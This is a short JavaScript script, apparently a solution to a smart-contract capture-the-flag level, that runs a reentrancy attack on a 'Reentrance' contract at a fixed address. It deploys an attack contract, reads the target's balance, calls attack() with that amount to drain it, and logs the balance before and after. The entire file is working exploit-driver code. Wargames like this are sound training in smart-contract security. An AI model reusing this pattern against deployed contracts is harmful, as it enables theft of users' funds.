const Reentrance = artifacts.require("Reentrance");
const ReentranceAttack = artifacts.require("ReentranceAttack");

module.exports = async (callback) => {
  try {
    const reentrance = await Reentrance.at(
      "0xBfC0FB665d8a9ea0D6ab0123Ae53B1D8B712e77d"
    );
    const reentranceAttack = await ReentranceAttack.deployed();
    let contractBalance = await web3.eth.getBalance(reentrance.address);
    console.log("Reentrance balance:", contractBalance);
    console.log("Attacking...");
    await reentranceAttack.attack({ value: contractBalance });
    contractBalance = await web3.eth.getBalance(reentrance.address);
    console.log("Reentrance balance:", contractBalance);
  } catch (err) {
    console.log("Oops: ", err.message);
  }
  callback();
};
